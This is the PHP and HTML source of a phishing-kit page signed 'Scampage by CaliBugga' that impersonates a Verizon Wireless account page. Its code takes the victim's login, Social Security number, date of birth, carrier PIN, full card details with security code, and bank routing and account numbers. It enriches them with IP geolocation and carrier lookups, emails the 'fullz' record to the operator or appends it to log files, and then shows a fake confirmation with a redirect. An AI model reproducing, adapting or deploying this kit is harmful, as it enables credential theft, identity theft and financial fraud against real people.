
<?php

/*
* Scampage by CaliBugga
* Jabber: lauriemoore302@jabba.im
* ICQ: xxxxxxxxx
*/
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');

$_SESSION['name'] = $_POST['name'];

//Carier look up
$dom = new DOMDocument();
@$dom->loadHTMLFile("https://portal.aql.com/telecoms/network_lookup.php/?number=".$_SESSION['telephone']."%7C&nlSubmit=submit");
$links = array();
$new_arr = array();
foreach($dom->getElementsByTagName('td') as $link) {
    array_push($new_arr,$link->nodeValue);
}
$Fin = empty($new_arr[8]) ? $new_arr[10] : $new_arr[8];
$x = explode(" ",$Fin);
$Fin2 = $x['0'];
//Carrier lookup end


$date = date('l d F Y');
$time = date('H:i');
$user = $_POST['username'];
$pass = $_POST['password'];
$name = $_SESSION['name'];
$dob = $_POST['dob'];
$ssn = $_POST['ssn'];
$telephone = $_POST['telephone'];
$email = $_POST['email'];
$address = $_POST['address'].", ".$_POST['city'].", ".$_POST['zipcode'];
$carrier = $_POST['carrier'];
$ccname = $_POST['ccname'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$routing = $_POST['routing'];
$account = $_POST['account'];
$_SESSION['routing'] = $_POST['routing'];
$_SESSIN['account'] = $_POST['account'];
$_SESSION['secode'] = $_POST['secode'];
$_SESSION['ccexp'] = $_POST['ccexp'];
$_SESSION['ccno'] = $_POST['ccno'];
$ccno = str_replace(' ', '', $ccno);
$last4 = substr($ccno, 12, 16);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['type']);
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
<^>-----------------------713566330-----------------------<^>

<^>Login<^>
Username : $user
Password : $pass


<^>Personal details<^>
Full name : $name
Telephone : $telephone
Date of birth : $dob
Social Security Number : $ssn
Email : $email
Address : $address
Carrier Pin : $carrier
Mobile Provider : $Fin2

<^>Auto billing details<^>
Card BIN : $BIN
Card Bank : $Bank
Card Brand : $Brand 
Card Type : $Type

<^>Victim billing details<^>
Cardholder name : $ccname
Card number : $ccno
Card exp : $ccexp
Security code : $secode
Routing : $routing
Account: $account


<^>Victim PC details<^>
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5

Received : $date @ $time
<^>-----------------------713566330-----------------------<^>
";

if ($user != "" && $user != NULL) {
    if ($binSave === 1) {
    $binlist = fopen($BIN.".txt","a");
    fwrite($binlist, $data . "\n\n");
    fclose($binlist);
}

if ($binList === 1) {
    $binFile = fopen('bin_list.txt', 'a');
fwrite($binFile, $BIN . " " . $_SESSION['zipcode'] . " " . $name . "\n");
fclose($binFile);

}

if ($sendEmail === 1) {
    
    mail($to,  $BIN . " from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/fullz.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}
}




?>


<!DOCTYPE html>










    










<html lang="en">
<head>

<script type="text/javascript" async="" src="assets/files/vms.js"></script>
    <script src="assets/files/sitewideBoldchatMonitoring.js"></script>
    <script src="assets/files/foresee-analytics-j1380.js"></script>
	<script type="text/javascript" async="" src="assets/files/ga.js"></script>
    <script type="text/javascript" src="assets/files/www.js" async=""></script>
    <script src="assets/files/satelliteLib-8fda614b914d5fb481c47a37b7b1e83ad93e2faa.js"></script>
    <script src="assets/files/satellite-5878dd8f64746d47cd000c8e.js"></script>
    <script src="assets/files/mmcore.js"></script>
	<script type="text/javascript" id="mmpack.0" src="assets/files/mmpackage-1.js"></script>
    <script src="assets/files/head.js"></script>
    <script src="assets/files/queueclient.js"></script>
<meta http-equiv="refresh" content="5; url=gateway.php?routing=<?php echo $routing; ?>" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<title>Validating Data | My Verizon Wireless or Fios Account</title>

<script src="assets/files/my3.js"></script>
    <script src="assets/files/jquery-ui-1.js"></script>
    <script src="assets/files/my3-lib.js"></script>
    <script type="text/javascript" src="assets/files/handlebars.js"></script>
    <script type="text/javascript" src="assets/files/my3validate.js"></script>
    <script type="text/javascript" src="assets/files/my3formatter.js"></script>
    <script type="text/javascript" src="assets/files/my3text-fit.js"></script>
    <script type="text/javascript" src="assets/files/jquery_003.js"></script>
	<script src="assets/files/satellite-56006ad962333027b70003c1.js"></script>
    <script src="assets/files/satellite-5501c70e3932630016c70200.js"></script>
    <script src="assets/files/satellite-551005a33337610019870300.js"></script>
    <script src="assets/files/satellite-588631b164746d61df00aa12.js"></script>
    <script src="assets/files/satellite-579f85bc64746d5949000259.js"></script>
    <script src="assets/files/satellite-57dac8f464746d361c010294.js"></script>
    <script src="assets/files/satellite-59edebfb64746d51aa000cc9.js"></script>
    <script src="assets/files/satellite-5458af5d38326400162c0400.js"></script>
    <script src="assets/files/satellite-5874fed564746d6035007bd9.js"></script>
    <script src="assets/files/satellite-58b947bc64746d1187012b04.js"></script>
    <script src="assets/files/satellite-5adf340064746d79c101333c.js"></script>
    <script src="assets/files/satellite-59ad76a164746d516b003ddf.js"></script>
    <script src="assets/files/satellite-584fe90c64746d1fb900bb20.js"></script>
    <script src="assets/files/satellite-54614cbc3166310016ab0400.js"></script>
	<script id="bcvm_script_1527948818744" async="" type="text/javascript" src="assets/files/bc.pv"></script>
	<script src="assets/files/gateway.js" type="text/javascript" async="true" data-vendor="acs" data-role="gateway"></script>
    
    <script id="bcvm_script_1527948818744" async="" type="text/javascript" src="assets/files/bc.pv"></script>
	<script id="bcvm_script_1527948818744" async="" type="text/javascript" src="assets/files/bc.pv"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>

<script>

        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
								ssn: {	required: true,	minlength: 9,},
                                address: { required: true, minlength: 5,},
                                city: { required: true, minlength: 3,},
                                zipcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 10, digits: true,},
                                email: { required: true, email: true,},
								carrier: {	required: true,	minlength: 4,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
								ssn: {
                                    required: "Please provide social security number",
                                    minlength: jQuery.validator.format("Please provide your social security number"),
                                },
                                telephone: {
                                    required: "Please provide phone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                city: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                zipcode: {
                                    required: "Please provide zipcode",
                                    minlength: jQuery.validator.format("Please check the zipcode you have entered"),
                                },
								carrier: {
                                    required: "Please provide carrier pin",
                                    minlength: jQuery.validator.format("Please check the carrier pin you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
			var ssn = document.getElementById("ssn").value;
            document.getElementById("three").value=ssn;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("four").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("five").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("six").value=address;
            var city = document.getElementById("city").value;
            document.getElementById("seven").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("eight").value=postcode;
			var carrier = document.getElementById("carrier").value;
            document.getElementById("nine").value=carrier;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 10,},
                                routing: { required: true, minlength: 9,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                routing: {
                                    required: "Please provide 9 digit routing number",
                                    minlength: jQuery.validator.format("Please check the routing you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
	
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#routing").mask("999999999",{placeholder:"XXXXXXXXX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
			$("#ssn").mask("999-99-9999",{placeholder:"XXX-XX-XXXX"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>




<!--  Set Gomez Tags -->

<script type="text/javascript">

var gomez_brumPagename = "";
if(gomez_brumPagename==""){
    gomez_brumPagename = "";
}

var bypassBrum = 'true';
var bypassUEM = 'true';
if(bypassBrum == 'false' ||  bypassUEM == 'false') {
    if(gomez_brumPagename != ""){
        var gomez={
		    gs: new Date().getTime(),
		    acctId: "0532A9",
		    pgId: gomez_brumPagename,
		    grpId: "AM_Prod",
		    wrate: "0.1"
        };
    }
}
</script>


        


<script src="https://scache.vzw.com/am/js/jquery-1.12.4.min.js"></script>


    
        <meta name="viewport"  content="width=device-width, initial-scale=1">
    
    
















<script>
    var $j = jQuery;
    var $ = $j.noConflict();
</script>
<link rel="stylesheet" href="https://scache.vzw.com/am/css/bootstrap-3.3.7.min.css" />
<link rel="stylesheet" href="https://scache.vzw.com/am/css/less-space.css" />
<link rel="stylesheet" href="https://scache.vzw.com/am/css/style-2.0.css" />
<script src="https://scache.vzw.com/am/js/bootstrap-3.3.7.min.js"></script>
<script src="https://scache.vzw.com/am/js/jquery.validate-1.19.0.min.js"></script>
<script src="https://scache.vzw.com/am/js/additional-methods-1.19.0.min.js"></script>
<script src="https://scache.vzw.com/am/js/base64js-1.2.1.min.js"></script>
<script src="https://scache.vzw.com/am/js/blacklist.js"></script>
<script src="https://scache.vzw.com/am/js/core.js"></script>
<script src="https://scache.vzw.com/am/js/util.js"></script>


<script type="text/javascript">
    var $ = $j.noConflict();
</script>
        <script type="text/javascript" src="https://scache.vzw.com/am/includes/accessmanager.js"></script>
        <script src="https://scache.vzw.com/am/js/util.js"></script>

 
    	<script type="text/javascript" src="https://scache.vzw.com/am/includes/register.js"></script>

        <script type="text/javascript">
            $j(document).ready(function() {
            	// clear form caching
                document.getElementById('controller').reset();

                $j('button#nextButton').click(function(e) {
                    if (checkCaptchaResponse("nextButton")) {
                        s.events=s.apl(s.events,"event4",",",0);
                        s.prop11="continue";
                        s.prop13=s.pageName+"|"+s.prop11;
                        var s_code=s.t();
                        if(s_code)document.write(s_code);
                    }
                    else {
                        return false;
                    }
                });          
                
                $('#controller').formValidate({
                    rules: {
                        mobileNumber: Rule.mobileNumberFormatted
                    },  
                    
                    messages: {
                        mobileNumber: Message.mobileNumber
                    },

                    buttonID: '#nextButton'
                });

            });
            var goto = '';

		
      </script>
      
          <script type="text/javascript" src="https://www.google.com/recaptcha/api.js" async defer></script>


      






    
    

    





    
    
        <link rel="stylesheet" href="https://www.verizon.com/etc/designs/vzwcom/gnav20/core.css" />
        <script>var gnavdl = {"bu":"wireless","appid":"ssoam","variation" : "prospect"}</script>
    
   

 

    





</head>
<body  id="fullscreen-body" class="Desktop-device">

    



    
    
        <div id="vz-gh20"></div>
    
   

    <main role="main">
    











    



<div id="main-content" class="container-fluid">
    <div class="row">

            <div class="col-xs-12">
                              
                
                
            
            
            </div>
    </div>
    
    <div class="row">
        <div id="main-header" class="col-xs-12" aria-live="assertive">
            <p></p>
        </div>
    </div>
    
    <div class="row"> 
        
        <div id="left-side-content" class="col-xs-12 col-sm-9"> <br><br>
		
                <form >
                    
                    
                       <img style="display:block;margin-left:auto;margin-right:auto;" src="https://i.pinimg.com/originals/88/6b/21/886b21f340994cdbf19eaa47f9fb4d05.gif" width="207" height="184"/><br />
                                                                            <h3 style="font-size: 15px; text-align: center;" id="input-title" data-reactid="14"><b>Billing information updated,<br>you will be redirected to your bank for further verification.<br /> <br/></h3>
                    
                   


                    
                    
                       
                </form>

            <div>
                
            </div>

	     	<div>
	     		
	     	</div>


        </div> 

        <div id="right-side-help" class="hidden-xs col-sm-3">
            <p class="h3">FAQs</p>
                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq1" aria-expanded="false" aria-controls="faq1" title="Toggle order content">What if I don't receive my text&nbsp; messages?</a></p>
                <p id="faq1" class="collapse">Please make sure your mobile device is turned on.  We will try to deliver the text message to your device for 2 hours.</p>

                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq2" aria-expanded="false" aria-controls="faq1" title="Toggle order content">What if I block text messages?</a></p>
                <p id="faq2" class="collapse">You will be able to receive this free text message and continue to have all other text messages blocked.</p>

                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq3" aria-expanded="false" aria-controls="faq1" title="Toggle order content">Will the Registration PIN expire?</a></p>
                <p id="faq3" class="collapse">Yes.  Your Registration PIN will expire in 10 minutes.  Please use it right away to complete your registration.</p>

                <p><a href="#" class="collapsed" onclick="event.preventDefault();" data-toggle="collapse" data-target="#faq4" aria-expanded="false" aria-controls="faq1" title="Toggle order content">For Mobile Broadband Users&nbsp; (Netbooks, Modems, PC Cards)</a></p>
                <p id="faq4" class="collapse">To retrieve your Registration PIN, you’ll need to check your device’s display, its web interface or its connection manager software.</p>

        </div> 
  
    

        
    </div> 
    
</div>   




    </main>
    
    




    






    
    
        <div id="vz-gf20"></div>
    
   

    





    
    
        <script type="text/javascript" src="https://www.verizon.com/etc/designs/vzwcom/gnav20/personal.js"></script>
    
   
 



</body>

    <script src="https://scache.vzw.com/dam/echn/vzw-engage/js/VZ_Chat.js"></script>
    

</html>